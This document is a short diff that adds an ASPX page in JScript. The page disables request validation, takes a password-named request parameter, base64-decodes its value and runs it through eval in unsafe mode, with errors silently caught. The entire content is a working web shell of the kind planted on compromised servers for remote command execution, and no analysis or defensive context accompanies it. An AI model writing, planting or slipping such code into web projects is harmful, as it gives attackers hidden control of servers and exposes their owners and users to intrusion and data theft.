@@ -1,0 +1,6 @@
+<%@ Page Language="Jscript" validateRequest="false"%><%
+try{var iia = Request.Item[System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("[password]"))];
+var arguments = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(iia));
+eval(arguments,System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("dW5zYWZl")));
+}catch(ex){
+}%>
